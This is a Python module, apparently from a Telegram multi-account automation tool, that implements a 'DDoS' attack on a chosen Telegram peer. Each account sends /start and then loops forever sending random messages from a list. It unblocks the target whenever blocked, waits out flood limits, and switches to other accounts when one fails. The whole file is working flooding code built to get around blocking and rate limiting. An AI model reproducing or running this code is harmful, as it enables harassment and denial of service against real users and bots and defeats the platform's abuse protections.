import asyncio

from telethon import TelegramClient, errors, functions
from typing import List
from random import choice
from loguru import logger

from .base import BaseModule
from models import field


class Ddos(BaseModule):
    TITLE = "DDoS"
    ID = "ddos"

    class Kwargs(BaseModule.Kwargs):
        target_peer: str = field("Peer")
        messages: List[str] = field()

    async def init(self):
        self.coroutines = [
            self.task(client)
            for client in await self.get_client(self.configuration.account_count)
        ]

    async def task(self, client: TelegramClient):
        if not client:
            return "No more free accounts"
        try:
            await self.safely_send(client, self.kwargs.target_peer, "/start")
        except:
            return await self.change_client(self.task, client)

        await client.edit_folder(self.kwargs.target_peer, 1)

        while True:
            message = choice(self.kwargs.messages)

            try:
                await self.safely_send(client, self.kwargs.target_peer, message)
            except:
                return await self.change_client(self.task, client)

    @classmethod
    async def safely_send(cls, client: TelegramClient, peer, text):
        try:
            await client.send_message(
                peer, text
            )
        except errors.YouBlockedUserError:
            await client(
                functions.contacts.UnblockRequest(
                    id=peer
                )
            )

            return await cls.safely_send(client, peer, text)
        except errors.FloodWaitError as f:
            if f.seconds > 600:
                logger.error(f"Account {client._self_id} got FloodWait for {f.seconds}. (Raising)")
                raise f

            logger.warning(f"Account {client._self_id} got FloodWait for {f.seconds}. (Sleeping)")

            await asyncio.sleep(f.seconds)
            return await cls.safely_send(client, peer, text)
        except Exception as e:
            logger.error(f"Account {client._self_id} got error: {e}")
            raise e
